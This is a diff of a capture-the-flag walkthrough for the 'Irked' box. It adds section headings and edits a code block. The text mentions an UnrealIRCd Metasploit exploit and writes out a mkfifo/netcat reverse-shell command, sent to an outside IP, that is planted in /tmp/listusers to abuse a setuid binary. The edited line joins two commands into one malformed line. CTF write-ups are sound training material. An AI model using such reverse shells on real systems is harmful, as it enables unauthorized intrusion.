@@ -18,6 +18,8 @@ This was a decent box. An IRC exploit gets you a shell with the IRC user but not
 
 Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)
 
+## Enumeration
+
 First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).
 
 ```bash
@@ -75,6 +77,8 @@ UnrealIRCd 3.x - Remote Denial of Service                                       
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result
 ```
+
+## Exploit
 
 There's a metasploit module. Let's try it out.
 
@@ -138,6 +142,8 @@ pwd
 /home/ircd/Unreal3.2
 ```
 
+## Setuid binary
+
 I will upgrade to a full TTY. To know how I did that, follow [this](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).
 
 ```bash
@@ -182,8 +188,7 @@ sh: 1: /tmp/listusers: not found
 The `viewuser` binary is searching for a file `/tmp/listusers`. Let's see if we can write to this file. I will try to upload a shell command in the file and start a listener on my local machine.
 
 ```bash
-ircd@irked:/home$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.102 6666 >/tmp/f" > /tmp/listusers                                                              
-<;cat /tmp/f|/bin/sh -i 2>&1|nc <my-ip> 6666 >/tmp/f" > /tmp/listusers
+ircd@irked:/home$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.102 6666 >/tmp/f" > /tmp/listusers <;cat /tmp/f|/bin/sh -i 2>&1 | nc <my-ip> 6666 > /tmp/f" > /tmp/listusers
 ```
 
 Now let's try to execute the binary again and see if we pop a shell.
